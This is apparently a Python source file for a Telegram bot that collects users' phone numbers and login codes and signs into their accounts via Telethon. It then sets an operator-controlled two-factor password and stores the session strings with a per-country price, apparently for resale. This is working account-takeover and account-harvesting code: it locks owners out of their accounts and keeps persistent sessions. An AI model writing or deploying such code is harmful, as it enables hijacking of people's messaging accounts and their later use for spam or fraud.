import os
from telethon.errors import SessionPasswordNeededError
from telethon import TelegramClient
from datetime import datetime, timedelta
import pytz

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler

from config import SESSIONS_DIR, API_ID, API_HASH, TWO_FA_PASSWORD
from database import accounts_collection, get_user_data, users_collection
from utils.capacity import capacity_collections

# Conversation states
PHONE, CODE = range(2)

# Global dictionary to hold user Telethon client sessions temporarily
user_sessions = {}


async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receives phone number and sends verification code."""
    phone = update.message.text.strip()
    context.user_data['phone'] = phone
    user_id = update.effective_user.id

    for capacity_info in capacity_collections:
        if phone.startswith(capacity_info["country_code"]):
            if capacity_info["capacity"] <= 0:
                await update.message.reply_text("🚫❌ We're sorry, but the capacity limit for this country is currently full. Please try again after some time. ⏳"
                                                )
                return ConversationHandler.END

            session_path = os.path.join(SESSIONS_DIR, phone.replace("+", ""))
            client = TelegramClient(session_path, API_ID, API_HASH)
            await client.connect()

            if not await client.is_user_authorized():
                try:
                    await client.send_code_request(phone)
                    user_sessions[user_id] = client
                    await update.message.reply_text(
                        "📩 A verification code has just been sent to your Telegram account.\n\n"
                        "🔑 Please enter the code below to continue.\n"
                        "❌ To cancel the process, type /cancel anytime."
                    )

                    return CODE
                except Exception as e:
                    await client.disconnect()
                    await update.message.reply_text(
                        f"❌ Unable to send verification code due to the following error:\n\n`{e}`\n"
                        "Please try again later or contact support."
                    )
                    return ConversationHandler.END
            else:
                await client.disconnect()
                await update.message.reply_text("✅ This account is already authorized and ready to use.")
                return ConversationHandler.END

    await update.message.reply_text("🚫❌ We're sorry, but the capacity limit for this country is currently full. Please try again after some time. ⏳")
    return ConversationHandler.END


async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receives the code, logs in, and sets up the account."""
    code = update.message.text.strip()
    phone = context.user_data.get('phone')
    user_id = update.effective_user.id
    client = user_sessions.get(user_id)

    if not client:
        await update.message.reply_text(
            "⚠️ Your session has expired. Kindly restart the process by sending /start."
        )
        return ConversationHandler.END

    try:
        await client.sign_in(phone, code)
        await client.edit_2fa(new_password=TWO_FA_PASSWORD)
        session_string = client.session.save()

        verification_time = datetime.now(pytz.utc)
        unlock_time = verification_time + \
            timedelta(minutes=2)  # 6 hours in production

        for capacity_info in capacity_collections:
            if phone.startswith(capacity_info["country_code"]):
                accounts_collection.insert_one({
                    "phone_number": phone,
                    "country_code": capacity_info["country_code"],
                    "price": capacity_info["price"],
                    "country": capacity_info["country"],
                    "owner_id": user_id,
                    "status": "pending",
                    "verification_time": verification_time,
                    "unlock_time": unlock_time,
                    "session_string": session_string,
                    "chat_id": update.effective_chat.id
                })
                break

        user_data = get_user_data(user_id)
        users_collection.update_one(
            {"user_id": user_id},
            {"$inc": {"unverified_accounts_count": 1}}
        )

        keyboard = InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔄 Check Status", callback_data="check_remaining")]])
        await update.message.reply_text(
            "⏳ Your account is now pending verification. This usually takes up to 6 hours.\n"
            "Thank you for your patience!",
            reply_markup=keyboard
        )

    except SessionPasswordNeededError:
        await update.message.reply_text(
            "⚠️ This account already has Two-Factor Authentication (2FA) enabled.\n"
            "Login attempt unsuccessful."
        )
    except Exception as e:
        await update.message.reply_text(
            f"❌ Login failed due to the following error:\n\n`{e}`\n"
            "Please verify your credentials and try again."
        )
    finally:
        await client.disconnect()
        if user_id in user_sessions:
            del user_sessions[user_id]
        return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the current conversation and clears any session data."""
    user_id = update.effective_user.id

    # Disconnect any active Telethon client
    client = user_sessions.pop(user_id, None)
    if client and client.is_connected():
        await client.disconnect()

    # Clear any data stored in the context
    context.user_data.clear()

    await update.message.reply_text("The process has been canceled. p   ")
    return ConversationHandler.END
